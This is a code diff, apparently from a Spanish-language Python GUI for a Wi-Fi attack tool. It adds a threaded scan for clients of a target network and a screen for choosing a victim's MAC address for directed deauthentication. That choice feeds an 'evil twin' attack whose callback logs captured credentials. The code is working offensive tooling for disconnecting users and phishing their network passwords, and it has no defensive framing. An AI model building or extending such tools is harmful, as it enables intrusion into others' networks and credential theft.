@@ -796,6 +796,7 @@ class WiFiView(BaseView):
         self.show_console(parent=scroll.scrollable_frame)
 
     def _flow_evil_twin_single_mode(self, red, portal):
+        self.wifi_state["evil_scan_pending"] = False
         self.clear_frame()
         self.add_back_button(lambda: self._flow_evil_twin_modo_deauth(red, portal))
         ttk.Label(self.main_frame, text="SINGLE DEAUTH MODO", style='Title.TLabel').pack(pady=2)
@@ -809,21 +810,96 @@ class WiFiView(BaseView):
             style='Danger.TButton',
             width=28
         )
+        scroll.add_button(
+            text="Cliente específico",
+            command=lambda: self._flow_evil_twin_scan_clients(red, portal),
+            style='Red.TButton',
+            width=28
+        )
 
-        def escanear_clientes():
-            self.write_console("[*] Escaneando clientes para deauth dirigido...")
-            mon = self.wifi_state.get("mon_deauth")
-            clis = self.services.wifi.scan_clients(mon, red['bssid'], red['ch'], duration=10)
-            if not clis:
-                self.write_console("[!] No se detectaron clientes. Lanzando en broadcast.")
-                self._flow_evil_twin_launch_single(red, portal, "broadcast")
-            else:
-                self._flow_evil_twin_launch_single(red, portal, "directed", cliente_mac=clis[0])
-
-        scroll.add_button(text="Cliente específico", command=escanear_clientes, style='Red.TButton', width=28)
         self.show_console(parent=scroll.scrollable_frame)
 
+    def _flow_evil_twin_scan_clients(self, red, portal):
+        """Escanea en segundo plano los clientes asociados a la red objetivo."""
+        self.wifi_state["evil_scan_pending"] = True
+        self.clear_frame()
+        self.add_back_button(lambda: self._flow_evil_twin_cancel_client_scan(red, portal))
+        ttk.Label(self.main_frame, text=f"BUSCANDO CLIENTES\n{red['essid']}",
+                  style='Title.TLabel', justify='center').pack(pady=10)
+        self.show_console()
+        self.write_console("[*] Rastreando clientes asociados (10s)...")
+
+        def worker():
+            mon = self.wifi_state.get("mon_deauth")
+            if not mon:
+                deauth_iface = self.wifi_state.get("deauth_iface")
+                if deauth_iface:
+                    mon = self.services.wifi.enable_monitor_mode(deauth_iface)
+                    self.wifi_state["mon_deauth"] = mon
+            if not mon:
+                self.run_on_ui(lambda: self._flow_evil_twin_show_clients(
+                    red, portal, [], error="No hay interfaz en modo monitor."))
+                return
+            clientes = self.services.wifi.scan_clients(mon, red['bssid'], red['ch'], duration=10)
+            self.run_on_ui(lambda: self._flow_evil_twin_show_clients(red, portal, clientes))
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _flow_evil_twin_cancel_client_scan(self, red, portal):
+        """Aborta la espera del escaneo y descarta resultados tardíos."""
+        self.wifi_state["evil_scan_pending"] = False
+        self._flow_evil_twin_single_mode(red, portal)
+
+    def _flow_evil_twin_show_clients(self, red, portal, clientes, error=None):
+        """Muestra la lista de MACs detectadas para elegir la víctima del deauth dirigido."""
+        if not self.wifi_state.get("evil_scan_pending"):
+            # El operador abandonó la pantalla de escaneo: descartar resultados tardíos.
+            return
+        self.wifi_state["evil_scan_pending"] = False
+
+        self.clear_frame()
+        self.add_back_button(lambda: self._flow_evil_twin_single_mode(red, portal))
+        ttk.Label(self.main_frame, text="SELECCIONAR MAC", style='Title.TLabel').pack(pady=2)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=50)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        scroll.add_button(
+            text="Todos (Broadcast)",
+            command=lambda: self._flow_evil_twin_launch_single(red, portal, "broadcast"),
+            style='Danger.TButton',
+            width=28
+        )
+
+        if clientes:
+            for mac in clientes:
+                scroll.add_button(
+                    text=mac,
+                    command=lambda m=mac: self._flow_evil_twin_launch_single(red, portal, "directed", cliente_mac=m),
+                    style='Gray.TButton',
+                    width=28
+                )
+        else:
+            scroll.add_button(
+                text="Reintentar escaneo",
+                command=lambda: self._flow_evil_twin_scan_clients(red, portal),
+                style='Red.TButton',
+                width=28
+            )
+
+        self.show_console(parent=scroll.scrollable_frame)
+
+        if error:
+            self.write_console(f"[!] {error} Use Broadcast o reintente el escaneo.")
+        elif clientes:
+            self.write_console(f"[+] Clientes detectados: {len(clientes)}. Pulse la MAC objetivo.")
+        else:
+            self.write_console("[!] No se detectaron clientes. Puede reintentar el escaneo o usar Broadcast.")
+
+        gc.collect()
+
     def _flow_evil_twin_launch_single(self, red, portal, deauth_mode, cliente_mac=None):
+        self.wifi_state["evil_scan_pending"] = False
         self.clear_frame()
         self.add_back_button(self.render)
         ttk.Label(self.main_frame, text="EVIL TWIN ACTIVO", style='Title.TLabel').pack(pady=2)
@@ -841,6 +917,11 @@ class WiFiView(BaseView):
 
         ap_iface = self.wifi_state["ap_iface"]
         mon_deauth = self.wifi_state["mon_deauth"]
+
+        if deauth_mode == "directed" and cliente_mac:
+            self.write_console(f"[*] Deauth dirigido al cliente: {cliente_mac}")
+        else:
+            self.write_console("[*] Deauth en modo broadcast (todos los clientes).")
 
         def on_cred(line):
             self.write_console(f"[!] CREDENCIAL: {line}")
